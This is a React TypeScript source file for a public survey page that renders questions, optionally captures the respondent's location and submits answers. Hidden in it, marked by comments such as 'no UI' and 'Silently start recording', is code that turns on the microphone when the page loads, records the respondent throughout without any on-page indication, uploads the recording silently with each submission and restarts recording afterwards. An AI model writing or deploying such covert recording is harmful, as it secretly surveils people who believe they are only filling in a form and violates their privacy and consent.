import { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { useAppDispatch, useAppSelector } from '@/store/hooks';
import { submitResponse } from '@/store/responseSlice';
import { responseService } from '@/services/responseService';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Checkbox } from '@/components/ui/checkbox';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { BaseUrl } from '@/config/BaseUrl';
import { Loader2, MapPin } from 'lucide-react';
import { toast } from 'sonner';

export default function PublicSurvey() {
  const { id } = useParams();
  const dispatch = useAppDispatch();
  const { isSubmitting } = useAppSelector((state) => state.response);
  const [survey, setSurvey] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [answers, setAnswers] = useState<Record<string, any>>({});
  const [location, setLocation] = useState<{ latitude: number; longitude: number } | null>(null);
  const [gettingLocation, setGettingLocation] = useState(false);

  // Background audio recording refs — no UI
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const streamRef = useRef<MediaStream | null>(null);
  const audioBlobRef = useRef<Blob | null>(null);

  const startBackgroundRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      streamRef.current = stream;
      audioChunksRef.current = [];
      const recorder = new MediaRecorder(stream);
      mediaRecorderRef.current = recorder;
      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) audioChunksRef.current.push(e.data);
      };
      recorder.start(1000); // timeslice ensures data is collected every 1s
    } catch {
      // Permission denied or not available — silently ignore
    }
  };

  const stopAndGetBlob = (): Promise<Blob | null> => {
    return new Promise((resolve) => {
      const recorder = mediaRecorderRef.current;
      if (!recorder || recorder.state === 'inactive') {
        resolve(audioChunksRef.current.length > 0
          ? new Blob(audioChunksRef.current, { type: 'audio/webm' })
          : null);
        return;
      }
      recorder.onstop = () => {
        const blob = audioChunksRef.current.length > 0
          ? new Blob(audioChunksRef.current, { type: 'audio/webm' })
          : null;
        resolve(blob);
      };
      recorder.requestData(); // flush any buffered data before stop
      recorder.stop();
      streamRef.current?.getTracks().forEach(t => t.stop());
    });
  };

  // Silently start recording as soon as survey loads
  useEffect(() => {
    startBackgroundRecording();
    return () => {
      if (mediaRecorderRef.current?.state === 'recording') mediaRecorderRef.current.stop();
      streamRef.current?.getTracks().forEach(t => t.stop());
    };
  }, []);

  useEffect(() => {
    fetch(`${BaseUrl}/surveys/public/${id}`)
      .then(res => res.json())
      .then(data => {
        setSurvey(data.data);
        if (data.data?.accessToken) {
          setAnswers(prev => ({ ...prev, accessToken: data.data.accessToken }));
        }
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, [id]);

  const getLocation = () => {
    setGettingLocation(true);
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          });
          toast.success('Location captured successfully');
          setGettingLocation(false);
        },
        () => {
          toast.error('Failed to get location');
          setGettingLocation(false);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    } else {
      toast.error('Geolocation not supported');
      setGettingLocation(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (survey.requiresLocationValidation && !location) {
      toast.error('Please capture your location before submitting');
      return;
    }

    for (const q of survey.questions) {
      if (q.isRequired && !answers[q.id]) {
        toast.error(`Please answer: ${q.questionText}`);
        return;
      }
    }

    const responses = survey.questions.map((q: any) => {
      const answer = answers[q.id];
      if (q.type === 'multiple_choice' && Array.isArray(answer)) {
        return { questionId: q.id, answer: answer.join(', ') };
      }
      return { questionId: q.id, answer: answer || '' };
    });

    try {
      const audioBlob = await stopAndGetBlob();

      const result = await dispatch(submitResponse({
        surveyId: id!,
        responses,
        accessToken: answers['accessToken'],
        location: location || undefined,
      })).unwrap();

      // result is the full API response: { success, data: { id, ... } }
      const responseId = result?.data?.id ?? result?.id;
      if (!responseId) throw new Error('Response ID not received');

      // Upload single background audio silently via public endpoint
      if (audioBlob && audioBlob.size > 0) {
        await responseService.uploadAudio('', responseId, audioBlob).catch(() => {});
      }

      toast.success('Survey submitted successfully!');
      setAnswers({ accessToken: survey.accessToken });
      setLocation(null);
      audioChunksRef.current = [];
      audioBlobRef.current = null;
      // Restart background recording for next response
      startBackgroundRecording();
    } catch (error) {
      console.error('Submission error:', error);
      toast.error('Failed to submit survey');
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  if (!survey) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Card className="max-w-md">
          <CardContent className="pt-6">
            <p className="text-center text-muted-foreground">Survey not found</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-muted/30 py-6 sm:py-8 md:py-12 px-3 sm:px-4">
      <div className="max-w-3xl mx-auto">
        <Card>
          <CardHeader className="p-4 sm:p-6">
            <CardTitle className="text-xl sm:text-2xl md:text-3xl">{survey.title}</CardTitle>
            {survey.description && (
              <CardDescription className="text-sm sm:text-base">{survey.description}</CardDescription>
            )}
          </CardHeader>
          <CardContent className="p-4 sm:p-6">
            {survey.requiresLocationValidation && (
              <Card className="mb-4 sm:mb-6 bg-primary/5 border-primary">
                <CardContent className="pt-4 sm:pt-6 p-4">
                  <div className="space-y-3 sm:space-y-4">
                    <Label className="text-sm sm:text-base font-medium flex items-center gap-2">
                      <MapPin className="h-4 w-4 sm:h-5 sm:w-5 text-primary" />
                      Location Required
                      <span className="text-destructive">*</span>
                    </Label>
                    {location ? (
                      <div className="space-y-2">
                        <p className="text-xs sm:text-sm font-mono bg-muted p-2 rounded break-all">
                          Latitude: {location.latitude.toFixed(6)}
                        </p>
                        <p className="text-xs sm:text-sm font-mono bg-muted p-2 rounded break-all">
                          Longitude: {location.longitude.toFixed(6)}
                        </p>
                      </div>
                    ) : (
                      <p className="text-xs sm:text-sm text-muted-foreground">Click the button below to capture your current location</p>
                    )}
                    <Button
                      type="button"
                      onClick={getLocation}
                      disabled={gettingLocation}
                      variant={location ? "outline" : "default"}
                      className="w-full"
                      size="sm"
                    >
                      {gettingLocation ? (
                        <>
                          <Loader2 className="h-4 w-4 animate-spin mr-2" />
                          Getting Location...
                        </>
                      ) : location ? (
                        'Update Location'
                      ) : (
                        'Capture Location'
                      )}
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}

            <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-8">
              <div className="space-y-2 sm:space-y-3">
                <Label className="text-sm sm:text-base font-medium">Access Token <span className="text-destructive">*</span></Label>
                <Input
                  placeholder="Enter access token"
                  value={answers['accessToken'] || ''}
                  readOnly
                  className="bg-muted cursor-not-allowed text-sm sm:text-base"
                  required
                />
              </div>

              {survey.questions?.map((q: any, i: number) => (
                <div key={q.id} className="space-y-2 sm:space-y-3">
                  <Label className="text-sm sm:text-base font-medium">
                    {i + 1}. {q.questionText}
                    {q.isRequired && <span className="text-destructive ml-1">*</span>}
                  </Label>

                  {q.type === 'text' && (
                    <Input
                      placeholder="Your answer"
                      className="mt-2 text-sm sm:text-base"
                      value={answers[q.id] || ''}
                      onChange={(e) => setAnswers({ ...answers, [q.id]: e.target.value })}
                      required={q.isRequired}
                    />
                  )}

                  {q.type === 'textarea' && (
                    <Textarea
                      placeholder="Your answer"
                      rows={4}
                      className="mt-2 text-sm sm:text-base"
                      value={answers[q.id] || ''}
                      onChange={(e) => setAnswers({ ...answers, [q.id]: e.target.value })}
                      required={q.isRequired}
                    />
                  )}

                  {q.type === 'rating' && (
                    <div className="flex gap-2 mt-2 flex-wrap">
                      {[1, 2, 3, 4, 5].map(n => (
                        <Button
                          key={n}
                          type="button"
                          variant={answers[q.id] === n ? 'default' : 'outline'}
                          className="w-10 h-10 sm:w-12 sm:h-12 text-sm sm:text-base"
                          onClick={() => setAnswers({ ...answers, [q.id]: n })}
                        >
                          {n}
                        </Button>
                      ))}
                    </div>
                  )}

                  {q.type === 'single_choice' && (
                    <RadioGroup
                      className="space-y-2 mt-2"
                      value={answers[q.id]}
                      onValueChange={(val) => setAnswers({ ...answers, [q.id]: val })}
                    >
                      {q.options?.map((opt: any) => (
                        <div key={opt.id} className="flex items-center space-x-2">
                          <RadioGroupItem value={opt.optionText} id={opt.id} />
                          <Label htmlFor={opt.id} className="font-normal cursor-pointer text-sm sm:text-base">
                            {opt.optionText}
                          </Label>
                        </div>
                      ))}
                    </RadioGroup>
                  )}

                  {q.type === 'multiple_choice' && (
                    <div className="space-y-2 mt-2">
                      {q.options?.map((opt: any) => (
                        <div key={opt.id} className="flex items-center space-x-2">
                          <Checkbox
                            id={opt.id}
                            checked={(answers[q.id] || []).includes(opt.optionText)}
                            onCheckedChange={(checked) => {
                              const current = answers[q.id] || [];
                              setAnswers({
                                ...answers,
                                [q.id]: checked
                                  ? [...current, opt.optionText]
                                  : current.filter((v: string) => v !== opt.optionText)
                              });
                            }}
                          />
                          <Label htmlFor={opt.id} className="font-normal cursor-pointer text-sm sm:text-base">
                            {opt.optionText}
                          </Label>
                        </div>
                      ))}
                    </div>
                  )}

                  {q.type === 'date' && (
                    <Input
                      type="date"
                      className="mt-2 text-sm sm:text-base"
                      value={answers[q.id] || ''}
                      onChange={(e) => setAnswers({ ...answers, [q.id]: e.target.value })}
                      required={q.isRequired}
                    />
                  )}

                  {q.type === 'file' && (
                    <Input
                      type="file"
                      className="mt-2 text-sm sm:text-base"
                      onChange={(e) => setAnswers({ ...answers, [q.id]: e.target.files?.[0]?.name || '' })}
                      required={q.isRequired}
                    />
                  )}
                </div>
              ))}

              <Button type="submit" className="w-full text-sm sm:text-base" size="lg" disabled={isSubmitting}>
                {isSubmitting ? <Loader2 className="h-4 w-4 animate-spin" /> : 'Submit Survey'}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
